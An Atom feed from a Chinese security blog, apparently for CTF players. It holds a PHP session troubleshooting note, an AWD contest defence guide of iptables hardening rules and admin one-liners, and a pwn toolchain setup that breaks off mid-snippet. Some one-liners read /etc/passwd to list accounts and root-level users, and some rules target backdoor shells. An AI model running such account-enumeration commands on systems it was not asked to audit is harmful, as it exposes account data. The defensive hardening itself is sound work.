<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AbelChe&#39;s Blog</title>
  
  <subtitle>Youth means limitless possibilities.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://AbelChe.com/"/>
  <updated>2019-11-04T06:41:52.531Z</updated>
  <id>http://AbelChe.com/</id>
  
  <author>
    <name>AbelChe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>大菜鸡的填坑日记</title>
    <link href="http://AbelChe.com/2019/11/04/%E5%A4%A7%E8%8F%9C%E9%B8%A1%E7%9A%84%E5%A1%AB%E5%9D%91%E6%97%A5%E8%AE%B0/"/>
    <id>http://AbelChe.com/2019/11/04/大菜鸡的填坑日记/</id>
    <published>2019-11-04T04:57:28.000Z</published>
    <updated>2019-11-04T06:41:52.531Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="LAMP-环境下-php-的-session-无法保存，无法读取"><a href="#LAMP-环境下-php-的-session-无法保存，无法读取" class="headerlink" title="LAMP 环境下 php 的 session 无法保存，无法读取"></a>LAMP 环境下 php 的 session 无法保存，无法读取</h1><ul><li><p>更新时间</p><ul><li>2019-11-04</li></ul></li><li><p>相关环境</p><ul><li>centos 7</li><li>PHP 7.1.22</li></ul></li><li><p>坑の描述</p><blockquote><p>项目登陆功能使用到session，但是session无法生成，<code>session_start();</code>执行后没有生成 session 文件。</p><ul><li>php.ini配置</li></ul><p><img src="https://prhpha.sn.files.1drv.com/y4mMLFaKr__JB8WHbjPq_hKbDeAiqod3sxuu8OBpVZi7rqzgnt_Sj4X4pjs5atTwynhuRp8IvckL8ONWyyXUeTtZd_VDsu1PX-4U5X6PLE1HyKcRiRoZlQpA31vMdGWgedX1AKFaM9K8FUImxBj56wiZFi6lrsFhOK3PD-had7Jlb4R91NOp5T3xON1eDR4mp2KGjxG_eR0B_mmCGuJaFv3AQ?width=673&height=148&cropmode=none" alt></p><ul><li>成功执行到<code>session_start()</code></li></ul><p><img src="https://zxmqbw.sn.files.1drv.com/y4mTcdMyXY1Fr6Ue7bjtzJIe0AUXq3CGTHQerodv-ZyLfK51S59qelf0y6fN9nO9tRa11qSLXpA9eCG41GXGLaWttq6Am1A8t-TPg0bARrJshqRHeVLU1xEHPBHhVJRnX3dh0FuQB15qLjl2sFW3wdZ8efIOxmyczMmSa2YckmAAmC-HlY71eyARuz8FmlGuV8g2BeoscDz9cvUxL_uRdJk3g?width=510&height=295&cropmode=none" alt></p><ul><li>没有 session 文件</li></ul><p><img src="https://mvpcza.sn.files.1drv.com/y4mmiP_vk8jGH2CeQNG-xgll8uiY1pIqAajgxStHYA4r3yA9UY7O3okICCUM7ioM5rYR2ZuKbfmJZvZR-ctIjzo93C1osNc5SUTLUUrh-KySB6S_ohjNeg9BBjv4i06z71C3xysYDKnTt19wVkkUuLX1Ahd3qmlv8FOCOwGxxQCCNuDRqdVQ_8LaeoHeD5n12ryqRqYOX1RqbUEvVi90B9uxg?width=335&height=79&cropmode=none" alt></p></blockquote></li><li><p>填坑</p><ol><li><p>linux上的环境，出了问题猜测是权限的问题，查看下<code>/var/lib/php/session</code>的文件夹权限</p><p><img src="https://cqtb4q.sn.files.1drv.com/y4mvj6fUPDrmALj7gG4RzZ1WqB8whVIcKqz6zmOjg3AbwSEqUjC7o4TnY3Ed3pwryFqwb-yb3xLCxCMHuqoI2ZnEf6i1WFXgb5bHebS3nk_jzi_wXcEa9T-c974GNYfnVyXdZ2NX_C0OTj2rvU6oCLMnT65uMJB2WmJoe9oziMO8nWSkqY4UZJeF7_nXNL6Xn921UlmABg2qheRZPAzC4iSwQ?width=475&height=121&cropmode=none" alt></p></li><li><p>想到前阵为了测试修改了 apache 的启动用户</p></li><li><p>于是将 apache 的启动用户修改回 apache，重启服务后问题解决</p><p><img src="https://2wg4yq.sn.files.1drv.com/y4mNaY6-yuaxeVFGI2I7FYoUjQiPnZmwpdSFpw6wz7anlJNA7evkcp_b-KjTyrDpig2acbaWsNEDvP1KnyEX-mAhyyqNSat4X0nC3G8kgXgpJCAETFJzuFGUORBPImLflaXdlcVXO-s38sgW8UrVvJPLwYX79bY9e81nLLWVomdDr3883EOWxQ-LngZzEHC_7DzMNDYi9RXFSkBWVMIRkOe5Q?width=659&height=175&cropmode=none" alt></p></li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;LAMP-环境下-php-的-session-无法保存，无法读取&quot;&gt;&lt;a href=&quot;#LAMP-环境下-php-的-session-无法保存，无法读取&quot; class=&quot;headerlink&quot; title=&quot;LAMP 环境下 
      
    
    </summary>
    
      <category term="坑" scheme="http://AbelChe.com/categories/%E5%9D%91/"/>
    
    
      <category term="php" scheme="http://AbelChe.com/tags/php/"/>
    
      <category term="web" scheme="http://AbelChe.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PWN刷题记录-Bugku</title>
    <link href="http://AbelChe.com/2019/10/08/PWN%E7%88%B7%E7%88%B7%E7%9A%84%E6%97%A5%E5%B8%B8/PWN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Bugku/"/>
    <id>http://AbelChe.com/2019/10/08/PWN爷爷的日常/PWN刷题记录-Bugku/</id>
    <published>2019-10-08T04:59:49.000Z</published>
    <updated>2019-10-08T05:02:46.339Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="PWN" scheme="http://AbelChe.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>AWD中舒服的姿势</title>
    <link href="http://AbelChe.com/2019/10/08/AWD%E4%B8%AD%E8%88%92%E6%9C%8D%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
    <id>http://AbelChe.com/2019/10/08/AWD中舒服的姿势/</id>
    <published>2019-10-08T04:24:16.000Z</published>
    <updated>2019-10-08T04:58:02.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><ul><li>方法一</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /var/lib/mysql</span></span><br><span class="line"><span class="comment"># mysqldump -uroot -p [库名] &gt; back.sql</span></span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><a id="more"></a><p>使用 navicat 等图形化工具连接，傻瓜化操作</p><h2 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h2><ul><li>方法一</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先进入数据库查看库是否存在，不存在就创建</span></span><br><span class="line"><span class="comment"># mysql -uroot -p</span></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; create database [库名];</span><br><span class="line">mysql&gt; use [库名];</span><br><span class="line">mysql&gt; <span class="built_in">source</span> back.sql;</span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先进数据库查看库是否存在，不存在就创建</span></span><br><span class="line"><span class="comment"># mysql -uroot -p [库名] &lt; back.sql</span></span><br></pre></td></tr></table></figure><ul><li>方法三</li></ul><p>使用 navicat 等图形化管理工具，傻瓜化操作</p><h1 id="常用的访问控制"><a href="#常用的访问控制" class="headerlink" title="常用的访问控制"></a>常用的访问控制</h1><h2 id="限制端口"><a href="#限制端口" class="headerlink" title="限制端口"></a>限制端口</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开放ssh</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#打开80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#开启多端口简单用法</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="限制ssh登录"><a href="#限制ssh登录" class="headerlink" title="限制ssh登录"></a>限制ssh登录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#禁止从xx.xx.xx.xx远程登陆到本机</span></span><br><span class="line">iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp --dport 22 -j DROP</span><br><span class="line"><span class="comment">#允许xx.xx.xx.xx网段远程登陆访问ssh</span></span><br><span class="line">iptables -A INPUT -s xx.xx.xx.1/24 -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="限制IP连接数和连接速率"><a href="#限制IP连接数和连接速率" class="headerlink" title="限制IP连接数和连接速率"></a>限制IP连接数和连接速率</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单个IP的最大连接数为 30</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br><span class="line"><span class="comment">#单个IP在60秒内只允许最多新建15个连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/s --<span class="built_in">limit</span>-burst 10 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="数据包简单识别，防止端口复用类的后门或者shell"><a href="#数据包简单识别，防止端口复用类的后门或者shell" class="headerlink" title="数据包简单识别，防止端口复用类的后门或者shell"></a>数据包简单识别，防止端口复用类的后门或者shell</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="限制访问"><a href="#限制访问" class="headerlink" title="限制访问"></a>限制访问</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#禁止从客户机1.1.1.4访问1.1.1.5上的任何服务</span></span><br><span class="line">iptable -t filter -A FORWARD -s 1.1.1.4 -d 1.1.1.5 -j DROP</span><br><span class="line"><span class="comment">#封杀1.1.1.4这个IP或者某个ip段</span></span><br><span class="line">iptables -I INPUT -s 1.1.1.4 -j DROP</span><br><span class="line">iptables -I INPUT -s 1.1.1.1/24 -j DROP</span><br></pre></td></tr></table></figure><h2 id="过滤异常报文"><a href="#过滤异常报文" class="headerlink" title="过滤异常报文"></a>过滤异常报文</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN</span><br><span class="line"><span class="comment">#匹配SYN标识位</span></span><br><span class="line">iptables -A INPUT -p tcp --syn</span><br><span class="line"><span class="comment">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line"><span class="comment">#丢弃没标志位的包</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP</span><br><span class="line"><span class="comment">#匹配到SYN ACK FIN URG RST PSH的丢弃（类似的操作自行举一反三）</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG,PSH -j DROP</span><br><span class="line"><span class="comment">#匹配到 SYN,RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP</span><br></pre></td></tr></table></figure><h2 id="防止DDos"><a href="#防止DDos" class="headerlink" title="防止DDos"></a>防止DDos</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span><br></pre></td></tr></table></figure><p><code>-m limit</code>：启用limit扩展<br><code>–limit 20/minute</code>：允许最多每分钟10个连接<br><code>–limit-burst 100</code>：当达到100个连接后，才启用上述20/minute限制</p><h2 id="丢弃陌生的TCP响应包-防止反弹式攻击"><a href="#丢弃陌生的TCP响应包-防止反弹式攻击" class="headerlink" title="丢弃陌生的TCP响应包,防止反弹式攻击"></a>丢弃陌生的TCP响应包,防止反弹式攻击</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</span><br></pre></td></tr></table></figure><h1 id="服务器及系统"><a href="#服务器及系统" class="headerlink" title="服务器及系统"></a>服务器及系统</h1><p>ssh连接：ssh &lt;-p 端口号&gt; [username]@[ip]</p><p>scp远程拷贝： scp [文件路径] [username]@[ip]:[存放路径]</p><p>显示最近登录的5个账号： last -n 5 | awk ‘{print $1}’</p><p>显示/etc/passwd的账户： cat /etc/passwd | awk -F ‘:’ ‘{print $1}’</p><p>查看uid为0的账号： awk -F: ‘{if($3==0)print $1}’ /etc/passwd</p><p>查找777权限的php文件：find . -name “*.php” -perm 4777</p><p>查看进程： ps aux | grep [pid或进程名]</p><p>查看已建立的网络连接及进程： netstart -antulp | grep EST</p><p>查看指定端口被哪个进程占用：</p><ul><li>lsof -i:[端口号]</li><li>netstat -tunlp | grep [端口号]</li></ul><p>杀死进程：</p><ul><li>kill [pid]</li><li>killall [进程名]</li><li>pkill [进程名]</li><li>pkill -u[用户名] #结束该用户（非root）的所有进程</li></ul><p>封杀IP或IP段： iptables -I INPUT -s source_ip[/mask] -j DROP</p><p>禁止从某个主机ssh远程到本机： iptable -t filter -A INPUT -s source_ip[/mask] -p tcp –dport 22 -j DROP</p><p>定时任务，在固定的时间间隔执行指定的系统指令或shell script：</p><ul><li>crontab [-u user] file_name</li><li>crontab [-u user] [-e |-l| -r]</li></ul><p>检测所有的 tcp 连接数量及状态： netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn</p><p>查看页面访问排名前10的IP： cat /var/log/apache2/access.log|cut -f1 -d|sort|uniq -c|sort -k  -r|head -</p><p>查看页面访问排名前10的 url：cat /var/log/apache2/access.log|cut -f4 -d|sort|uniq -c|sort -k  -r|head -</p><p>不允许任何人修改 www 目录下的文件： chattr -R +i /var/www/html</p><p>解除不允许修改的属性：chattr -R -i /var/www/html</p><p>抓取流量： tcpdump -s 0 -w tcplog.pcap port 9999 </p><h1 id="加固脚本"><a href="#加固脚本" class="headerlink" title="加固脚本"></a>加固脚本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Allow youself Ping other hosts , prohibit others Ping you</span></span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br><span class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#Close all INPUT FORWARD OUTPUT, just open some ports</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line"><span class="comment">#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#Open multiport</span></span><br><span class="line"><span class="comment">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span></span><br><span class="line"><span class="comment">#Control IP connection</span></span><br><span class="line"><span class="comment">#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span></span><br><span class="line"><span class="comment">#A single IP allows up to 15 new connections in 60 seconds</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#Prevent port reuse</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="comment">#Filter abnormal packets</span></span><br><span class="line">iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP</span><br><span class="line"><span class="comment">#Prevent DoS attacks</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span><br><span class="line"><span class="comment">#Discard unfamiliar TCP response packs to prevent rebound attacks</span></span><br><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;数据库&quot;&gt;&lt;a href=&quot;#数据库&quot; class=&quot;headerlink&quot; title=&quot;数据库&quot;&gt;&lt;/a&gt;数据库&lt;/h1&gt;&lt;h2 id=&quot;备份&quot;&gt;&lt;a href=&quot;#备份&quot; class=&quot;headerlink&quot; title=&quot;备份&quot;&gt;&lt;/a&gt;备份&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;方法一&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# cd /var/lib/mysql&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# mysqldump -uroot -p [库名] &amp;gt; back.sql&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;方法二&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="AWD" scheme="http://AbelChe.com/categories/AWD/"/>
    
    
      <category term="AWD" scheme="http://AbelChe.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>PWN入门-Web混不下去了怎么办</title>
    <link href="http://AbelChe.com/2019/09/24/PWN%E7%88%B7%E7%88%B7%E7%9A%84%E6%97%A5%E5%B8%B8/PWN%E5%85%A5%E9%97%A8-Web%E6%B7%B7%E4%B8%8D%E4%B8%8B%E5%8E%BB%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/"/>
    <id>http://AbelChe.com/2019/09/24/PWN爷爷的日常/PWN入门-Web混不下去了怎么办/</id>
    <published>2019-09-24T03:34:16.000Z</published>
    <updated>2019-10-08T09:40:11.480Z</updated>
    
    <content type="html"><![CDATA[<p>Web 狗一只，最近打 ctf 愈发觉得 pwn 的重要，于是便有了当爷爷的冲动！</p><p><strong>JOJO！我不当狗了！</strong></p><p><img src="https://rfpzqq.sn.files.1drv.com/y4mvd9Oip3PylZBMV4Xe_0HLpqIn7_YtZjHrhKlGj3ceUGUNrd-x-Zg2A4FCIPyBPMbP5YDn6VNLxeGWKJVLUvrba6z6Klt5C6rUO-D31dORpAorrjVfSpIJgNcqVPnaTuYYjLXMU8N856NoR1arCntzcKq9lI2E2u36RalGPSx-U4LnDA2DezfM_duYfHLRwSAjxb6l6MLriBezCrRBX0kSA?width=700&height=350&cropmode=none" alt></p><a id="more"></a><h1 id="PWN-环境搭建"><a href="#PWN-环境搭建" class="headerlink" title="PWN 环境搭建"></a>PWN 环境搭建</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>我用的是 ubuntu 18.04 ，安装完成后先<strong>换源</strong>，先备份官方源 <code>sudo cp /etc/apt/source.list /etc/apt/source.list.b</code> ，更新 /etc/apt/sources.list 为以下内容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-security main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p><strong>更新，并安装必要的软件(vim git gedit ssh socat等)</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -f install</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p><strong>安装 pwntools</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install -U setuptools</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p><strong>安装 pwndbg</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p><strong>安装 peda 插件</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> “<span class="built_in">source</span> ~/peda/peda.py” &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p><strong>安装 libcdatabase</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database.git</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">./get</span><br></pre></td></tr></table></figure><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p><strong>pip 出现问题建议先升级</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo pip3 install --upgrade pip3</span><br></pre></td></tr></table></figure><blockquote><p>出现报错：<code>ImportError: cannot import name main</code></p><p>修改 /usr/bin/pip 为如下内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pip <span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span 